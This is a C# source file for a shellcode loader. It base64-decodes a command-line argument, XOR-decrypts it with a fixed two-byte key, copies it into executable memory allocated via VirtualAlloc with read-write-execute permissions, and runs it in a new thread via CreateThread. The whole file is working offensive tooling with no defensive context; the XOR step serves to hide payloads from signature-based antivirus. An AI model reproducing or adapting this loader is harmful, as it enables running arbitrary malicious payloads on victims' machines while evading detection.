using System;
using System.Runtime.InteropServices;

namespace loader
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0 || args[0].Contains("+") || args[0].Contains("/"))
            {
                Console.WriteLine("loader.exe payload");
                Environment.Exit(0);
            }
            string str = args[0].TrimEnd('=').Replace('-', '+').Replace('_', '/');
            byte[] code = xor(Convert.FromBase64String(str));
            execute(code);
        }

        public static byte[] xor(byte[] input)
        {
            char[] key = { 'Y', '4', };
            byte[] output = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                output[i] = (byte)(input[i] ^ key[i % key.Length]);
            }
            return output;
        }

        public static bool execute(byte[] shellcode)
        {
            try
            {
                UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;

                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);

                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("exception: " + e.Message);
                return false;
            }
        }

        // Used to Load Shellcode into Memory:
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
          IntPtr hHandle,
          UInt32 dwMilliseconds
        );
    }
}
